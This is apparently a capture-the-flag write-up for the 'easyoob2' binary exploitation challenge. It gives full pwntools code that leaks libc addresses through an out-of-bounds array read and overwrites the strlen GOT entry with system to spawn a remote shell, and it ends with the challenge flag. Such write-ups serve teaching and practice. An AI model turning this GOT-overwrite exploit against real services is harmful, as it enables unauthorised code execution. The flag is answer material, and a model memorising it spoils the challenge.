# easyoob2

It is nice to have a function that gives you the flag. But it's not so easy in real life.

Can you find a way to spawn a shell from exploiting the service?

MD5 (easyoob2.zip) = b62c87cd2b6c6240020f7cd5ad5167a4

Author: daniellimws

`nc challs.nusgreyhats.org 10526`

```
$ tree easyoob2
easyoob2
├── easyoob2
├── easyoob2.c
└── easyoob2.zip
$ checksec easyoob2
[*] 'easyoob2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     # X
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000) # X
```

# Pwntools skeleton for i/o
I like to write functions that abstract away I/O interaction with the binary. Keep the definitions here in mind for later:
```python
from typing import Optional
from pwnscripts import *
context.binary = './easyoob2'
#r = context.binary.process()
r = remote("challs.nusgreyhats.org", 10526)

def cmd(typ: int,
        ind: Optional[int]=None,
        score: Optional[int]=None,
        name: Optional[bytes]=None,
        *, recv=True):
    s = b'%d' % typ
    if ind is not None: s += b' %d' % ind
    if name is not None:
        assert len(name) <= 3
        s += b' %s' % name
    if score is not None:
        assert score < 1<<32
        s += b' %d' % score
    r.sendlineafter(b'\n> ', s)
    if recv: return r.recvline()
```

# Top-level overview
`easyoob2` is a standard "find the libc version and ret2system" problem. In this case, the steps to solving the problem are:
1. leak two libc pointers
2. calculate the remote libc version
3. find the remote address of system
4. call `system(<user controlled data>)` somehow

Let's cover these steps one-by-one.
## Leaking libc
Unlike `easyoob`, the `entry leaderboard[20];` array is declared as a global variable in `easyoob2`. This puts the `leaderboard[]` array on the `.bss` section of the binary (open a disassembler to see this), which is located nearby to the [GOT table](https://blog.fxiao.me/got-plt/). The GOT holds the addresses of libc functions that we want to read (and later write to), so **there is some low value of** `i` **such that** `leaderboard[i] == &printf or &puts or &fgets or &strlen or...`

You can calculate the `leaderboard[]` index required to reach a specific libc function using `pwntools`:
```python
def lboard_ind_of(got_func: str) -> int:
    return (
        context.binary.got[got_func]
       -context.binary.symbols['leaderboard']
    )//8
```

And then, you can leak a libc function address by doing a few conversions on the output of a `handle_read()` command:
```python
def libc_func_addr(f: str):
    pos = lboard_ind_of(f)
    ls = cmd(1, pos).split(b' ') # call handle_read(..., pos)
    hi,lo = ls[1].ljust(4,b'\0'), p32(int(ls[-1]),signed=True)
    return unpack(lo+hi)
```

## Calculating the remote libc version (and getting the address of `system`)
Once upon a time, [I made a library for this](https://github.com/152334H/pwnscripts). Surprisingly enough, it still works:
```python
context.libc = context.libc_database.libc_find(
    {f:libc_func_addr(f) for f in ['puts', 'setvbuf']}
)
log.info('system: '+hex(context.libc.symbols['system']))
```
Upon execution:
```sh
[*] found libc! id: libc6_2.31-0ubuntu9.7_amd64
[*] system: 0x7f425f7e32c0
```
If you _don't_ have a premium fancy preinstalled setup, you can use the [link](https://libc.blukat.me/) greyhats provided to find the remote libc version. After that, you would serch for the address of `system()` using that libc id.

That works fine, but I like my software better.

## Calling `system`
Now for the slightly interesting part: how do we call `system("/bin/sh")`?

Unlike in `easyoob`, there is no (easy) way to edit the return pointers located at the call stack. For this specific problem, the GOT Table happens to be read+write (note `checksec` from beginning!), so we can make use of the `handle_write` command to replace a libc function with `system`.

This simplifies our decision making process into finding the best libc call site; looking for a function that accepts a user-controlled buffer as the first argument. **Conveinently**, the currently unused 3rd command, `handle_upperify`, has a line that does exactly just that: 
```c
char* name = leaderboard[cmd.pos].name;
int len = strlen(name);
```
So, the idea goes:
1. overwrite the GOT entry for `strlen` with the address of `system`
    ```python
    def write_word(ind: int, val: int):
        assert val < 1<<56
        hi,lo = val>>32, val&0xffffffff
        lo = u32(p32(lo), signed=True)
        hi = p32(hi)[:3]
        cmd(2, ind, lo, hi)
    write_word(lboard_ind_of('strlen'), context.libc.symbols['system'])
    ```
2. create a leaderboard entry with a name of `"sh;"`. This works because `system()` will check the `PATH` environment variable for the location of `sh`, much like a normal terminal.
3. call `handle_upperify`.

```python
cmd(2, 0, 0, b'sh;')
cmd(3, 0, recv=False)
r.interactive()
```

That's it.

# flag
`grey{0k_n0t_b4d_t1m3_t0_try_th3_h4rd3r_0n3s}`
